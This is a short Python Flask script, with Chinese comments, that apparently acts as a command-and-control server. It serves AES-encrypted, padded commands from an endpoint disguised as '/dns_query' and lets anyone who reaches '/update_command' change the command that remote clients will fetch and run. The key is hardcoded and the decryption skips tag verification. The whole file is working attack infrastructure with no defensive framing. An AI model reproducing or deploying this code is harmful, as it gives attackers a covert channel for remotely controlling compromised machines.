from flask import Flask, request
from Crypto.Cipher import AES
import base64
import random
import string  # 导入 string 模块
import json

app = Flask(__name__)

# AES加密和解密函数
def encrypt(message, key):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(message.encode())
    return base64.b64encode(nonce + ciphertext).decode()

def decrypt(ciphertext, key):
    raw_data = base64.b64decode(ciphertext)
    nonce = raw_data[:16]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(raw_data[16:])
    return plaintext.decode()

# 生成随机填充数据
def generate_padding(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

encryption_key = b'0123456789abcdef'  # 16字节AES密钥
command_to_execute = "echo Hello, World!"  # 默认命令

@app.route('/dns_query', methods=['GET'])
def dns_query():
    padded_command = command_to_execute + '<<<END>>>' + generate_padding(64)  # 添加分隔符和64字节随机填充
    encrypted_command = encrypt(padded_command, encryption_key)
    return json.dumps({"payload": encrypted_command, "protocol": "custom-protocol"})

@app.route('/update_command', methods=['POST'])
def update_command():
    global command_to_execute
    data = request.json
    command_to_execute = data['command']
    return 'Command updated'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
